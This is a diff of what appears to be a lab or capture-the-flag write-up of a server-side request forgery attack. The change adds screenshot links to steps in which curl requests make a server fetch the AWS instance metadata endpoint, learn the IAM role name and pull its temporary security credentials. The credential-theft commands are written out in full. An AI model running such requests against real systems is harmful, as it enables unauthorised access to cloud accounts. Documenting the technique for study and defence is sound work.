@@ -23,6 +23,8 @@ Tinkered with https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/private
    
 2) Next tried ```curl -X POST http://3.15.107.79/ -d "url=http://169.254.169.254/latest/meta-data/"``` revealing the **iam/** metadata key. The goal was to extract the temporary security credentials from ```iam/security-credentials/role-name```.   
 ![I am](iam_exposed.png)   
-3) Used ```curl -X POST http://3.15.107.79/ -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"``` to get the role-name which was "APICallerRole"
-4) To get the temp security credentials used ```curl -X POST http://3.15.107.79/ -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/APICallerRole"```
+3) Used ```curl -X POST http://3.15.107.79/ -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"``` to get the role-name which was "APICallerRole"   
+![Role Name](Role_Name.png)
+4) To get the temp security credentials used ```curl -X POST http://3.15.107.79/ -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/APICallerRole"```   
+![Temp Sec Credentials](Temp_Sec_Credentials.png)
    
